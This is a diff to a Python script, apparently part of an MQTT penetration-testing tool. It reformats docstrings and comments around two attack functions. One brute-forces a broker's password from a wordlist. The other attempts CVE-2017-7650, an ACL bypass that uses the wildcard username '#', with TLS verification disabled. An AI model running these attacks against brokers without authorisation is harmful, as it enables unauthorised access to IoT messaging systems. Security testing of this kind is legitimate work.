@@ -5,26 +5,30 @@ from random import randint
 import sys
 
 # callback function for the connect request
+
 def on_connect(client, userdata, flags, rc):
     if rc==0:
         client.connected = True
 
-"""Performs the brute force attack
+"""
+Performs the brute force attack
+
 Parameters:
-    ip_target (str): The ip of the broker
-    port (int): The port to connect to
-    username (str): The username to use when trying all passwords from the wordlist
-    wordlist_path (str): The path to the wordlist file used to get the passwords to try
-    tls_cert (str): The path to the CA certificate used to connect over TLS
+    ip_target (str):        The ip of the broker
+    port (int):             The port to connect to
+    username (str):         The username to use when trying all passwords from the wordlist
+    wordlist_path (str):    The path to the wordlist file used to get the passwords to try
+    tls_cert (str):         The path to the CA certificate used to connect over TLS
 
 Returns:
     results ([bool, str]): array containing a password and the related boolean indicating if the
-                           passwod worked or not
+                           password worked or not
 """
+
 def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert, client_key):
     # open the wordlist file
     with open(wordlist_path) as f:
-        # for each password we try to connect to the broker using it along with the username
+        # for each password we try to connect to the broker using it with the username
         # provided as paramenter of the function
         for line in f:
             password = line[:-1]
@@ -51,6 +55,19 @@ def brute_force(ip_target, port, username, wordlist_path, tls_cert, client_cert,
     return [False,""]
 
 
+"""
+Try to exploit CVE-2017-7650, which 'allows clients with username or client id set to
+'#' or '+' to bypass pattern based ACLs or third party plugins'.
+
+Parameters:
+    ip_target (str):        The ip of the broker
+    port (int):             The port to connect to
+    wordlist_path (str):    The path to the wordlist file used to get the passwords to try
+    tls_cert (str):         The path to the CA certificate used to connect over TLS
+
+Returns:
+    results (bool):         boolean indicating if the attack worked or not
+"""
 
 def username_bug(ip_target, port, tls_cert, client_cert, client_key):
     client = mqtt.Client()
@@ -59,7 +76,7 @@ def username_bug(ip_target, port, tls_cert, client_cert, client_key):
     client.username_pw_set('#', '')
     print('trying wildcard username: #')
 
-        # if the tls_cert value is different from None, try to connect over TLS
+    # if the tls_cert value is different from None, try to connect over TLS
     if tls_cert != None:
         client.tls_set(tls_cert, client_cert, client_key, cert_reqs=ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLS, ciphers=None)
         client.tls_insecure_set(True)
@@ -67,8 +84,8 @@ def username_bug(ip_target, port, tls_cert, client_cert, client_key):
     client.loop_start()
     sleep(3)
     client.loop_stop()
-        # if we are able to connect, we break the loop and we return the list of passwords and
-        # if each password was working or not
+    # if we are able to connect, we break the loop and we return the list of passwords and
+    # if each password was working or not
     
     if client.connected:
         return True
